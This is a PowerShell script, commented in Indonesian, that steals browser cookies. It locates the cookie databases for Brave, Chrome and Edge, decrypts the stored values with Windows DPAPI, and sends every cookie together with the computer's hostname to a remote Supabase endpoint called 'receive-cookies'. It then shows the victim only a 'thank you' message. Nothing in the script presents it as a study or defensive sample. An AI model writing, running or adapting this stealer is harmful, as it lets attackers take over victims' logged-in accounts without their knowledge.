function Get-ChromiumCookies {
    param([string]$BrowserPath)
    $cookies = @()
    $userDataPaths = @(
        "$env:LOCALAPPDATA\$BrowserPath\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\$BrowserPath\User Data\Profile *\Cookies"
    )
    foreach ($path in (Get-ChildItem $env:LOCALAPPDATA\$BrowserPath -Recurse -Filter "Cookies" -ErrorAction SilentlyContinue | Select -ExpandProperty FullName)) {
        # Copy file to memory (avoid locking)
        $tempFile = [System.IO.Path]::GetTempFileName()
        Copy-Item $path $tempFile -Force
        try {
            Add-Type -Path "C:\Program Files\System.Data.SQLite\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempFile")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc FROM cookies"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $encryptedValue = [System.Convert]::FromBase64String($reader["value"])
                # DPAPI decryption (Windows)
                $entropy = [byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
                $plainBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                $plainValue = [System.Text.Encoding]::UTF8.GetString($plainBytes)
                $cookies += @{
                    name = $reader["name"]
                    value = $plainValue
                    domain = $reader["host_key"]
                    path = $reader["path"]
                    expiry = [int][double]::Parse($reader["expires_utc"])
                }
            }
            $reader.Close()
            $conn.Close()
        } catch { Write-Error $_ }
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    }
    return $cookies
}

# 2. Ambil cookies dari Brave, Chrome, Edge
$allCookies = @()
$browsers = @("BraveSoftware\Brave-Browser", "Google\Chrome", "Microsoft\Edge")
foreach ($b in $browsers) {
    $c = Get-ChromiumCookies -BrowserPath $b
    $allCookies += $c
}

# 3. Kirim ke Supabase edge function
$payload = @{
    hostname = $env:COMPUTERNAME
    browser = "Brave|Chrome|Edge"
    cookies = $allCookies
} | ConvertTo-Json -Depth 10

$response = Invoke-RestMethod -Uri "https://bsunzewnefxyamapczzw.supabase.co/functions/v1/receive-cookies" -Method Post -Body $payload -ContentType "application/json"

# 4. Tampilkan "Terima kasih"
Write-Host "Terima kasih"